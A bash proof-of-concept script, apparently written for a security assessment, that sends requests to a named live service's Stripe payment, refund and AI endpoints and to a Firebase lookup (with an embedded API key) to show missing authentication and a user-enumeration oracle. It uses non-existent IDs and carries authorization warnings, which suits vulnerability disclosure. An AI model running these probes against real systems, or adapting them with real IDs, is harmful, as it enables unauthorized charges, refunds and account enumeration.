#!/usr/bin/env bash
# ============================================================================
# SAFE PoC / VALIDATION ONLY  -  aply.com / teamfeed-server
# ----------------------------------------------------------------------------
# Purpose: demonstrate that the /api/stripe/* money endpoints do NOT require
#          authentication, WITHOUT performing any real financial or user action.
#
# Safety:  - Uses a NON-EXISTENT applicationId (all-zero UUID).
#          - Uses a NON-EXISTENT pipelineId.
#          - No real applicant is read, charged, refunded, or accepted.
#          - The only expected responses are 404 "Application not found" /
#            400 validation errors, which prove the request reached the
#            handler before any auth check.
#          - Do NOT modify this to use a real applicationId. That would be
#            unauthorized financial action.
#
# Use only with written authorization from the asset owner.
# ============================================================================
set -u
B="${1:-https://teamfeed-server.onrender.com}"
UUID="00000000-0000-0000-0000-000000000000"
TMP="$(mktemp)"
trap 'rm -f "$TMP"' EXIT

echo "[*] Target: $B"
echo

echo "== 1) Stripe money endpoints: is auth enforced? (non-existent app id) =="
for ep in accept-no-charge charge-balance refund-deposit; do
  code=$(curl -sS -m 20 -o "$TMP" -w '%{http_code}' \
          -X POST -H 'Content-Type: application/json' \
          -d "{\"applicationId\":\"$UUID\"}" "$B/api/stripe/$ep" 2>/dev/null)
  body=$(head -c 160 "$TMP" | tr -d '\n')
  printf '  POST /api/stripe/%-18s -> HTTP %s  %s\n' "$ep" "$code" "$body"
  case "$code" in
    401|403) echo "      RESULT: auth enforced (PASS / no issue)" ;;
    *)       echo "      RESULT: NO AUTH CHALLENGE - handler processed request (auth gap)" ;;
  esac
done

echo
echo "== 2) create-checkout-session: auth + input handling (bogus pipeline) =="
code=$(curl -sS -m 20 -o "$TMP" -w '%{http_code}' \
        -X POST -H 'Content-Type: application/json' \
        -d '{"pipelineId":"zzz-nonexistent","applicationData":null,"returnUrl":null}' \
        "$B/api/stripe/create-checkout-session" 2>/dev/null)
printf '  POST /api/stripe/create-checkout-session -> HTTP %s  %s\n' "$code" "$(head -c 160 "$TMP" | tr -d '\n')"
[ "$code" = "401" ] || echo "      RESULT: NO AUTH CHALLENGE (auth gap)"

echo
echo "== 3) AI endpoints: unauthenticated + no rate limit (benign text only) =="
A="https://aply-server.onrender.com"
for i in 1 2 3; do
  code=$(curl -sS -m 30 -o "$TMP" -w '%{http_code}' \
          -X POST -H 'Content-Type: application/json' \
          -d "{\"name\":\"Safe PoC probe $i\"}" \
          "$A/ai/enrich-company" 2>/dev/null)
  printf '  POST %s/ai/enrich-company #%s -> HTTP %s\n' "$A" "$i" "$code"
done

echo
echo "== 4) Firebase user enumeration (NON-EXISTENT random address only) =="
K="AIzaSyCf761n3UQTSJQ0eHpALN0p74cnmDbcih0"
r=$(curl -sS -m 20 -H 'Content-Type: application/json' \
      -d '{"identifier":"zz-nonexistent-poc@example.invalid","continueUri":"https://aply.com/"}' \
      "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K" 2>/dev/null)
echo "  createAuthUri -> $(echo "$r" | head -c 160)"
echo "      (a 'registered' boolean is an enumeration oracle)"

echo
echo "[*] Done. No financial/user action was performed."